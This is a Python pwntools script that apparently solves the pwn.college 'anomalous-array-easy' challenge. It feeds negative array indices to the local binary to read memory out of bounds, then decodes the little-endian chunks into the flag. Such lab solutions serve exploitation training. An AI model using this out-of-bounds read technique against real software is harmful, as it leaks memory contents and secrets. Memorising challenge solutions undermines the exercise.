from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def try_exploit():
    flag_chunks = []
    
    # For 60-char flag, we need 8 chunks (60/8 = 7.5, so 8 chunks)
    # Start from index -85 and read 8 consecutive chunks
    for index in range(-85, -85 + 8):
        try:
            p = process("/challenge/anomalous-array-easy")
            
            # Wait for the index prompt
            p.recvuntil(b"Which number would you like to view?")
            
            # Send the index
            p.sendline(str(index).encode())
            
            # Get the response
            response = p.recvuntil(b"Your hacker number is", timeout=2)
            hex_line = p.recvline().decode().strip()
            p.close()
            
            # Extract hex string
            hex_value = hex_line.split()[-1]  # Get the last word (the hex)
            
            print(f"Index {index}: Raw hex: {hex_value}")
            
            # Handle odd-length hex strings (partial chunks)
            if len(hex_value) % 2 != 0:
                # Pad with zero to make even length
                hex_value = '0' + hex_value
            
            try:
                bytes_data = bytes.fromhex(hex_value)
                # The 8-byte value is stored in little-endian, so reverse it
                reversed_bytes = bytes_data[::-1]
                chunk = reversed_bytes.decode('ascii', errors='ignore').replace('\x00', '')
                flag_chunks.append(chunk)
                
                print(f"Index {index}: Decoded: '{chunk}'")
                
                # Check if we found the end of flag
                if '}' in chunk:
                    print("[+] Found end of flag!")
                    break
                    
            except ValueError as e:
                print(f"Index {index}: Failed to parse hex '{hex_value}' - {e}")
                # Try to salvage what we can
                if len(hex_value) > 0:
                    # Pad to even length and try again
                    padded_hex = hex_value if len(hex_value) % 2 == 0 else '0' + hex_value
                    try:
                        bytes_data = bytes.fromhex(padded_hex)
                        reversed_bytes = bytes_data[::-1]
                        chunk = reversed_bytes.decode('ascii', errors='ignore').replace('\x00', '')
                        flag_chunks.append(chunk)
                        print(f"Index {index}: Salvaged: '{chunk}'")
                    except:
                        continue
                
        except Exception as e:
            print(f"Index {index} failed: {e}")
            continue
    
    # Reconstruct the flag
    flag = ''.join(flag_chunks)
    print(f"\n[RAW RECONSTRUCTED DATA]: {flag}")
    print(f"[RAW LENGTH]: {len(flag)}")
    
    # Try to find the actual flag in the reconstructed data
    if 'pwn_college{' in flag:
        start = flag.index('pwn_college{')
        # Look for closing brace
        if '}' in flag[start:]:
            end = flag.index('}', start) + 1
            final_flag = flag[start:end]
            print(f"\n[SUCCESS] Found flag: {final_flag}")
        else:
            # If we don't have the closing brace, take everything from start
            final_flag = flag[start:]
            print(f"\n[PARTIAL FLAG]: {final_flag}")
    else:
        print("\n[!] Flag pattern not found")
        # Maybe the flag is backwards or scrambled?
        print("Trying reversed...")
        print(f"Reversed: {flag[::-1]}")
        
        # Try looking for common patterns
        for i in range(len(flag)):
            if flag[i:i+4] == 'pwn_':
                print(f"Found 'pwn_' at position {i}")
            if flag[i:i+4] == 'lege':
                print(f"Found 'lege' at position {i}")

if __name__ == "__main__":
    try_exploit()
